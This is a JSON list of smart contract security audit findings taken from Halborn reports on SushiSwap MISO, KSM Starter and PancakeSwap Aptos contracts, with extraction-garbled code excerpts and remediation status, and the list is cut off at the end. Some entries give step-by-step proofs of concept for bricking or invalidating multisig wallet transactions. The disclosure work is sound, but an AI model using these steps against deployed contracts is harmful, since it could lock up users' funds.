[{"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "Auction/BatchAuction.sol, Auction/DutchAuction.sol, In smart contracts Access/MISOAdminAccess.sol, Access/PointListFactory .sol, Auction/ Token/MintableToken.sol, Token/FixedToken.sol, HyperbolicAuction.sol, Token/SushiToken.sol, Helper/MISOHelper.sol, Utils/BoringBatchable.sol, Utils/BoringFactory.sol, Utils/Owned.sol, Vault/GnosisSafeFactory.sol Utils/Timeclock.sol, and Vault/TokenVault.sol there are methods like initAccessControls (), setMinimumFee(), setDividends(), deployPointList(), transferAnyERC20Token(), commitEth() , commitTokens(), finalize(), withdrawTokens(), initMarket() etc. are marked as public but they are never directly called within the same contract or in any of its descendants. Utils/BoringOwnable.sol, initPointListFactory(), deprecateFactory(), Utils/WETH9.sol, Risk Level: Likelihood - 1 Impact - 1 Recommendations: If the function is not intended to be called internally or by descendants, it is better to mark all these functions as external instead of public to save gas. Remediation Plan: The SushiSwap team accepts the risk. 32 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Informational"]}, {"title": "MISSING ADDING OPERATOR ROLE AND INTERFACE TO THE DEPLOYED CHILD CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "PointList is checking for OperatorRole in setPoints, that means that the admin would have to add itself as operator in order to set the points. This is causing all PointLists created with the PointListFactory to not allow the admin to setPoints as shown in Listing 22. Deploying a PointList from the factory and setting points i by calling setPoints is giving the error of missing operator role as shown in Figure Figure 1. Figure 1: Require error returned when calling setPoints after the contract has been deployed using PointListFactory After adding the operator role with addOperatorRole it is possible to call setPoints as shown in Figure Figure 2. Furthermore, It was noticed that the address(this) is also added as an operator to the under-laying created child contract as shown in line 129 on Listing 21. The operator role does only allow the setPoints function to 33 Figure 2: Successfully calling the setPoints after the operator role has been added be called. However, there exists no interface from the PointListFactory to call any of the methods present on the created child PointList. Moreover, the PointListFactory is adding itself as an operator on the created PointList, but the creator of the PointList (list owner and admin) can easily remove it by calling removeOperatorRole. Code Location: Listing 21: PointListFactory.sol (Lines 134,129) 126 pointList = createClone ( pointListTemplate ); 127 if ( _accounts . length > 0) { 128 129 130 131 132 133 } else { 134 135 } IPointList ( pointList ). initPointList ( address ( this )) ; MISOAccessControls ( pointList ). addOperatorRole ( address ( this )) ; IPointList ( pointList ). setPoints ( _accounts , _amounts ); MISOAccessControls ( pointList ). addAdminRole ( _listOwner ); MISOAccessControls ( pointList ). removeAdminRole ( address ( this )) ; IPointList ( pointList ). initPointList ( _listOwner ); Listing 22: PointList.sol (Lines 70) 69 function setPoints ( address [] memory _accounts , uint256 [] memory _amounts ) external override { 70 require ( hasOperatorRole ( msg . sender ) , \" PointList . setPoints : Sender 34 must be operator \"); 71 require ( _accounts . length != 0) ; 72 require ( _accounts . length == _amounts . length ); Risk Level: Likelihood - 1 Impact - 1 Recommendations: If thats an intended functionality it should be explained to the customers when deploying the PointListFactory contract and using it. Furthermore, if no interface will be provided to the PointListFactory is better to remove access control to under-laying contract since compromising the PointListFactory would allow any child PointList to be compromised as well, this will make sure that the least privilege security principle is meet. Remediation Plan: SOLVED: Removed addOperatorRole for the Factory address, and checking for hasAdminRole on the deployed child contract 35 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Informational"]}, {"title": "POINTLIST FACTORY DEPRECATION HAS NO EFFECT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "Deprecating a PointListFactory does not do anything aside from emitting an event an updating the internal newAddress variable as shown in Figure 23. The newAddress variable is not checked anywhere inside the contract, meaning that the Factory can still create pointList childs based on the pointListTemplate Code Location: Listing 23: PointListFactory.sol (Lines 89) * @notice Deprecates factory . * @param _newAddress Blank address . */ 81 /* * 82 83 84 85 function deprecateFactory ( address _newAddress ) public { 86 require ( accessControls . hasAdminRole ( msg . sender ) , \" PointListFactory : Sender must be admin \" ); require ( newAddress == address (0) ) ; emit FactoryDeprecated ( _newAddress ); newAddress = _newAddress ; 87 88 89 90 } Risk Level: Likelihood - 1 Impact - 1 36 Recommendations: The deprecation funcionallity seams to not be in use so the recommendation is to remove the code from the contract if thats the case. If not using the deprecation feature is unintended make sure to use the newAddress to validate if the Factory has been deprecated when creating new PointList childs. The deprecation functionality should be denying the creation of new contracts. Remediation Plan: SOLVED and INFORMED: The deprecate functionality is used to inform on the client side that a new address of the factory is present without breaking the compatibility with the old factory 37 3.10 (HAL-10) INDEX OUT OF RANGE MISSING CHECKS - INFORMATIONAL ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Informational"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "It was identified that KSMStarter Contracts are missing nonReentrant guard. In contract IDO.sol, functions register and in contract KSTStaking .sol, functions stake and unstake.sol, and in contract KSMIDO.sol function buy(uint256) are missing nonReentrant guard. Also, in these functions, external calls are called before all state changes are resolved, making it vulnerable to a Reentrancy attack. To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 2: IDO.sol (Lines 215,216,217) 215 216 217 218 staking . lock ( msg . sender , claimStartTime ); // locks users staked balance idoParticipants = idoParticipants . add (1) ; emit Registered ( msg . sender , claimStartTime , lockedBal , tier ); } Listing 3: KSTStaking.sol (Lines 45,47,48) function stake ( uint256 value ) external notHalted { require ( value > 0, \" KSTStaking : stake value should be greater than 0\" ); _token . safeTransferFrom ( _msgSender () , address ( this ) , value ); 43 44 45 46 14 47 48 49 } _balances [ _msgSender () ] = _balances [ _msgSender () ]. add ( value ); emit Stake ( _msgSender () , block . timestamp , value ); Listing 4: KSTStaking.sol (Lines 55,56) 51 52 53 54 55 56 57 function unstake ( uint256 value ) external lockable { require ( _balances [ _msgSender () ] >= value , ' KSTStaking : insufficient staked balance '); _balances [ _msgSender () ] = _balances [ _msgSender () ]- value ; _token . safeTransfer ( _msgSender () , value ); emit Unstake ( _msgSender () , block . timestamp , value ); } Listing 5: KSMIDO.sol (Lines 53,64,65,66,67,68) 53 paymentToken . safeTransferFrom ( msg . sender , address ( this ) , _paymentAmount ); 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 uint256 tokensToPurchase = _paymentAmount . mul ( tokenPrice ); uint256 difference ; if ( _paymentAmount . add ( totalRaised ) > raiseCap ) { difference = raiseCap . sub ( _paymentAmount ); // fill the remaining cap tokensToPurchase = difference . mul ( tokenPrice ); } else { difference = _paymentAmount ; } uint256 userEthAmount = user . tokenAmount . div ( tokenPrice ); // full amount require ( difference <= userEthAmount , \" not correct eth value \"); user . claimAmount = tokensToPurchase ; // set how much tokens can claim user . swapAmount = difference ; // set how much movr was sent user . tokenAmount = difference . mul ( tokenPrice ); // set token amount based on eth sent totalRaised = totalRaised + difference ; // increase total raised emit Bought ( msg . sender , difference ); 15 Risk Level: Likelihood - 2 Impact - 4 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The KSM-Starter team solved the issue by adding the nonReentrant modifier. 16 ", "labels": ["Halborn", "KSM_Starter", "Severity: Medium"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In contract KSMStarterLotteryRNG.sol the return value of an external transfer call LINK.transfer(msg.sender,LINK.balanceOf(address(this))) is not checked. It should be noted that token do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 6: KSMStarterLotteryRNG.sol (Lines 56) function returnLINK () external ownerOrOperator { LINK . transfer ( msg . sender , LINK . balanceOf ( address ( this ))); } 55 56 57 58 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. The ERC20 standard recommends throwing exceptions in functions transfer and transferFrom. References: ERC20 API: Transfer and TransferFrom 17 Remediation Plan: SOLVED: The KSM-Starter team solved the issue by using SafeERC20 implementation. Also, they added the safetransfer function to the code: Listing 7 1 IERC20 ( address ( LINK )) . safeTransfer ( msg . sender , LINK . balanceOf ( address ( this ))); 18 ", "labels": ["Halborn", "KSM_Starter", "Severity: Medium"]}, {"title": "MISSING ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "are found multiple of Lack instances zero is There missing. when assigning user supplied address values to state variables directly. In VestingCommunityIncentives.sol, VestingTeam.sol and VestingTreasury.sol contracts function setBeneficiary(address) lacks a zero-check on _addy. where validation validation found VestingMarketing.sol, Address has address been Code Location: Listing 8: VestingCommunityIncentives.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } Listing 9: VestingMarketing.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } Listing 10: VestingTeam.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } 19 Listing 11: VestingTreasury.sol (Lines 81) 79 80 81 82 function setBeneficiary ( address _addy ) external { require ( msg . sender == beneficiary ); beneficiary = _addy ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed to this function due to the OpenZeppelin RBAC it is better to add proper address validation when assigning a value to a variable from user supplied inputs. Remediation Plan: SOLVED: KSM-Starter team solved the issue by adding the zero address check (require(_addy != address(0));) to the code. 20 ", "labels": ["Halborn", "KSM_Starter", "Severity: Low"]}, {"title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In multiple functions KSMStarter uses OpenZeppelins safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. In this case both tokens are set in the constructor by the creator of the contract, so they are trusted, but it would be still a good practice to perform this check. Code Location: Listing 12: IDO.sol 1 idoToken . safeTransfer ( msg . sender , claimable . idoTokenAmount ); 2 swapToken . safeTransferFrom ( msg . sender , address ( this ) , swapTokenAmount ); 3 swapToken . safeTransfer ( owner () , swapToken . balanceOf ( address ( this )) ); 4 idoToken . safeTransfer ( owner () , totalIdoTokens . sub ( totalSwapped )) ; Listing 13: KSTStaking.sol 1 _token . safeTransferFrom ( _msgSender () , address ( this ) , value ); 2 _token . safeTransfer ( _msgSender () , value ); 21 Listing 14: VestingCommunityIncentives.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 15: VestingTreasury.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 16: VestingMarketing.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 17: VestingTeam.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 18: KSMIDO.sol 1 paymentToken . safeTransferFrom ( msg . sender , address ( this ) , _paymentAmount ); 2 idoToken . safeTransfer ( msg . sender , sendAmount ); Risk Level: Likelihood - 2 Impact - 3 22 Recommendations: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: SOLVED: KSM-Starter team claims that tokens will always be ERC20 and validated on the client-side. Thus, only the owner is allowed to input these tokens in the smart contract. 23 ", "labels": ["Halborn", "KSM_Starter", "Severity: Low"]}, {"title": "USE OF BLOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "During a manual review, the use of block.timestamp in IDO.sol, KSTStaking .sol, VestingCommunityIncentives.sol, VestingMarketing.sol, VestingTeam The contract developers .sol, and VestingTreasury.sol were observed. should be aware that this does not mean current time. now is an alias for block.timestamp. The value of block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Miners can influence the timestamp by a tolerance of 900 seconds. Code Location: Listing 19: IDO.sol (Lines 239,240,241,242,243) 239 240 241 242 243 244 require ( block . timestamp >= t1 . swapStart && block . timestamp <= t1 . swapEnd , \" IDO : t1 swap start / end not time \" ); require ( swap ( swapTokenAmount ) , \" IDO : t1 swap error . \"); Listing 20: IDO.sol (Lines 249,250,251,252,253) 249 250 251 252 253 254 require ( block . timestamp >= t2 . swapStart && block . timestamp <= t2 . swapEnd , \" IDO : t2 swap start / end not time \" ); require ( 24 Listing 21: IDO.sol (Lines 267,268,269,270,271) 267 268 269 270 271 272 require ( block . timestamp >= t3 . swapStart && block . timestamp <= t3 . swapEnd , \" IDO : t3 swap start / end not time \" ); require ( swap ( swapTokenAmount ) , \" IDO : t3 swap error . \"); Listing 22: IDO.sol (Lines 277,278,279,280,281) 277 278 279 280 281 282 require ( block . timestamp >= t4 . swapStart && block . timestamp <= t4 . swapEnd , \" IDO : t4 swap start / end not time \" ); require ( Listing 23: IDO.sol (Lines 291,292,293,294,295) 291 292 293 294 295 296 require ( block . timestamp >= t5 . swapStart && block . timestamp <= t5 . swapEnd , \" IDO : t5 swap start / end not time \" ); require ( Listing 24: IDO.sol (Lines 310) 310 311 require ( block . timestamp >= claimStartTime , \" IDO : Claim start not yet .\" ); require ( claimable . claimedAmount == 0 , \" IDO : Already claimed \" ); Listing 25: IDO.sol (Lines 452) 452 453 require ( block . timestamp >= t5 . swapEnd , \" IDO : Swap time not done yet \" ); uint256 totalSwapped = getTotalSwapped () ; 25 Listing 26: KSTStaking.sol (Lines 60) 60 61 require ( userUnlockTime > block . timestamp , \" KSTStaking : unlock is in the past \" ); if ( _unlockTime [ user ] < userUnlockTime ) { Listing 27: VestingCommunityIncentives.sol (Lines 36,37,38,39,40,41) 36 37 38 39 40 41 42 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 28: VestingCommunityIncentives.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 29: VestingCommunityIncentives.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 30: VestingCommunityIncentives.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( Listing 31: VestingMarketing.sol (Lines 36,37,38,39,40,41) 36 37 38 39 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" 26 40 41 42 ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 32: VestingMarketing.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 33: VestingMarketing.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 34: VestingMarketing.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( Listing 35: VestingTeam.sol (Lines 36,37,38,39,40,41) 36 37 38 39 40 41 42 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 36: VestingTeam.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); 27 Listing 37: VestingTeam.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 38: VestingTeam.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( Listing 39: VestingTreasury.sol (Lines 36,37,38,39,40,41) 36 37 38 39 40 41 42 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 40: VestingTreasury.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 41: VestingTreasury.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 42: VestingTreasury.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( 28 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: RISK ACCEPTED: The KSM-Starter team accepts the risk and continues using block.timestamp as 900 seconds fluctuation is not very crucial to the client. 29 ", "labels": ["Halborn", "KSM_Starter", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "KSM contract IDOFactory.sol, KST.sol, IDO.sol, KSMIDO.sol, KSTStaking.sol , IKSTStaking.sol, TestERC20.sol, KSMStarterLotteryRNG.sol, and USDT.sol uses the floating pragma 0.8.6. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 43: (Lines 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.6; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version with known bugs for the compiler version. When possible, do not use floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. 30 Remediation Plan: SOLVED: KSM-Starter team locked the pragma version. 31 ", "labels": ["Halborn", "KSM_Starter", "Severity: Low"]}, {"title": "OUTDATED DEPENDENCIES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "It was noticed that the 4.1.0 version of openzepplin-contracts is used in smart contracts. However, the latest version of those libraries is 4.3.2, which fixes a vulnerability in UUPSUpgradeable. Code Location: Listing 44: package.json (Lines 27) \" dependencies \": { \" @chainlink / contracts \" : \" ^0.2.0 \" , \" @openzeppelin / contracts \" : \" ^4.1.0 \" , \" @openzeppelin / test - helpers \" : \" ^0.5.11 \" , \" dotenv \" : \" ^10.0.0 \" } 25 26 27 28 29 30 31 } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Even though UUPSUpgradeable is not used directly within contracts, it is always important to keep all libraries up-to-date. References: Open Zeppelin Advisory UUPS Implementation Workaround 32 Remediation Plan: SOLVED: version to 4.3.2. KSM-Starter team updated the library openzepplin-contracts 33 ", "labels": ["Halborn", "KSM_Starter", "Severity: Low"]}, {"title": "PRAGMA TOO RECENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "KSM contract uses one of the latest pragma version (0.8.6) which was released on June 22nd, 2021. The latest pragma version (0.8.7) was released in August 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases In the Solitidy Github repository, there is a json file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_- by_version.json Code Location: Listing 45: (Lines 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.6; Risk Level: Likelihood - 1 Impact - 2 34 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. Remediation Plan: Risk-Accepted: The KSM-Starter team accepts the risk and continues using pragma version 0.8.6. 35 ", "labels": ["Halborn", "KSM_Starter", "Severity: Informational"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "It has been observed that important functionality is missing emitting event for some functions on the IDO.sol contract. These functions should emit events. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. These functions should emit events. Code Location: Listing 46: IDO.sol (Lines 443) 440 441 442 443 444 function setSwapPrice ( uint256 _price ) external ownerOrOperator { require (! priceSet , \" IDO : price already set . \"); priceSet = true ; swapPrice = _price ; } Listing 47: IDO.sol (Lines 461) 459 460 461 462 function setOperator ( address _operator ) public ownerOrOperator { require ( _operator != address (0) ) ; operator = _operator ; } Risk Level: Likelihood - 1 Impact - 2 36 Recommendations: For best security practices, consider as much as possible declaring events at the end of the function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED: KSM-Starter team added events to the above function. 37 3.10 (HAL-10) POSSIBLE MISUSE OF PUBLIC FUNCTIONS - INFORMATIONAL ", "labels": ["Halborn", "KSM_Starter", "Severity: Informational"]}, {"title": "FUNCTION TO SET THRESHOLD CAN GET THE MULTISIG WALLETS TOTALLY STUCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "init_set_threshold and init_remove_owner can be called in parallel during usual operations in multisig wallets. However, this behavior can produce a situation where threshold becomes greater than number of owners. As a consequence, multisig wallets can get totally stuck, i.e.: no more transactions or withdrawals can be done on behalf of them. It is important to note that the likelihood of this situation to happen drastically increases because pancake-multisig-wallet contract is planned to be used as a library for extended implementations of multisig wallets by the community. Here is a proof of concept showing how to exploit this security issue: Proof of Concept: Initial situation: 3 owners and threshold is 2 1. Owner 1 calls init_set_threshold function to change the threshold to 3. 2. Owner 2 calls approve_set_threshold function. 3. Owner 1 calls init_remove_owner function. 4. Owner 2 calls approve_remove_owner function. 5. Owner 1 calls execute_set_threshold function and now the threshold is 3. 6. Owner 3 calls approve_remove_owner function. 7. Owner 2 calls execute_remove_owner function and now there are only 2 owners. 8. Finally, the multisig wallet gets totally stuck because there are only 2 owners, but the threshold is 3. 13 Final situation: 2 owners and threshold is 3 Code Location: Listing 1: pancake-multisig-wallet/sources/multisig_wallet.move (Lines 422-424) 412 let multisig_txs = borrow_global_mut < MultisigTxs < ParamsType > >(  multisig_wallet_addr ); 413 let tx = Table :: borrow_mut (& mut multisig_txs . txs , seq_number ); 414 assert !( Table :: length (& tx . approvals ) >= ( multisig_wallet . threshold  as u64 ) , ERROR_LESS_THAN_THRESHOLD ); 415 assert !( tx . owners_seq_number == multisig_wallet . owners_seq_number ,  ERROR_OWNERS_SEQ_NUMBER_NOT_MATCH ); 416 tx . is_executed = true ; 417 multisig_wallet . last_executed_seq_number = seq_number ; 418 419 assert !( timestamp :: now_seconds () >= tx . eta ,  ERROR_TIMELOCK_NOT_SURPASSED ); 420 assert !( timestamp :: now_seconds () < tx . expiration ,  ERROR_MULTISIG_TX_EXPIRED ); 421 422 if ( type_info :: type_name < ParamsType >() == type_info :: type_name <  RemoveOwnerParams >() ) { 423 multisig_wallet . owners_seq_number = multisig_wallet .  owners_seq_number + 1; 424 }; 14 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Update the logic of execute_multisig_tx function to increase the value of owners_seq_number by 1 every time the amount of owners or the value of the threshold are modified. Remediation plan: SOLVED: The issue was fixed in commit 0a4fde8. 15 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Critical"]}, {"title": "APPROVED TRANSACTIONS CAN BE INVALIDATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_multisig_tx function allows that an owner maliciously (or mis- takenly) invalidates an approved transaction. As a consequence, every transaction, like adding / removing an owner, setting a new threshold or withdrawing from the multisig wallet, can always be invalidated by just 1 malicious owner, even if the transaction goes to approval again and again. It is important to note that the likelihood of this situation to happen drastically increases because pancake-multisig-wallet contract is planned to be used as a library for extended implementations of multisig wallets by the community. Here is a proof of concept showing how to exploit this security issue: Proof of Concept: Initial situation: 3 owners and threshold is 2 1. Owner 1 calls init_set_threshold function to change the threshold to 1. 16 2. Owner 2 calls approve_set_threshold function and now the transaction is ready to be executed. 3. Any of the owners calls execute_multisig_tx function. The result is successful and an ExecuteMultisigTxEvent event is emitted. However, the threshold does not change. 17 4. If any of the owners calls execute_set_threshold function, it will throw an error message because the approved transaction became invalidated. Code Location: Listing 2: pancake-multisig-wallet/sources/multisig_wallet.move (Lines 406,410,417) 406 public fun execute_multisig_tx < ParamsType : copy + store >( sender : &  signer , multisig_wallet_addr : address , seq_number : u64 ) acquires  MultisigWallet , MultisigTxs , MultisigWalletEvents { let sender_addr = signer :: address_of ( sender ); let multisig_wallet = borrow_global_mut < MultisigWallet >( 407 408  multisig_wallet_addr ); 409 assert !( Table :: contains (& multisig_wallet . owners , sender_addr ) ,  ERROR_NOT_OWNER ); 410 assert !( multisig_wallet . last_executed_seq_number == MAX_U64 ||  seq_number > multisig_wallet . last_executed_seq_number ,  ERROR_MULTISIG_TX_INVALIDATED ); 411 412 let multisig_txs = borrow_global_mut < MultisigTxs < ParamsType > >(  multisig_wallet_addr ); 413 414 let tx = Table :: borrow_mut (& mut multisig_txs . txs , seq_number ); assert !( Table :: length (& tx . approvals ) >= ( multisig_wallet .  threshold as u64 ) , ERROR_LESS_THAN_THRESHOLD ); 415 assert !( tx . owners_seq_number == multisig_wallet .  owners_seq_number , ERROR_OWNERS_SEQ_NUMBER_NOT_MATCH ); 416 417 tx . is_executed = true ; multisig_wallet . last_executed_seq_number = seq_number ; Risk Level: Likelihood - 5 Impact - 3 18 Recommendation: Make use of capabilities in execution functions to avoid that someone maliciously or mistakenly calls execute_multisig_tx function and inval- idates approved transactions. Remediation plan: SOLVED: The issue was fixed in commit d09bfd6. 19 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: High"]}, {"title": "PRIVILEGED ADDRESS TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The set_admin function from swap module could set the admin to an invalid address mistakenly, unwillingly losing control of pancake-swap contract, which cannot be undone in any way. Currently, the admin of the contract can change its address using the aforementioned function in a single transaction and without confirmation from the new address. Since the admin is planned to be a multisig contract, the likelihood of this scenario to happen is very low, but it is included in the report as a preventive measure, applying the security-in-depth approach. Code Location: Listing 3: pancake-swap/sources/swap/swap.move (Lines 701-702) 698 public entry fun set_admin ( sender : & signer , new_admin : address )  acquires SwapInfo { let sender_addr = signer :: address_of ( sender ); let swap_info = borrow_global_mut < SwapInfo >( RESOURCE_ACCOUNT ); assert !( sender_addr == swap_info . admin , ERROR_NOT_ADMIN ); swap_info . admin = new_admin ; 699 700 701 702 703 } Risk Level: Likelihood - 1 Impact - 4 20 Recommendation: It is recommended to split admin transfer functionality into set_admin and accept_admin functions. The latter function allows the transfer to be completed by the recipient. Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 21 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Low"]}, {"title": "INSECURE MINIMUM THRESHOLD WHEN INITIALIZING MULTISIG WALLETS", "html_url": 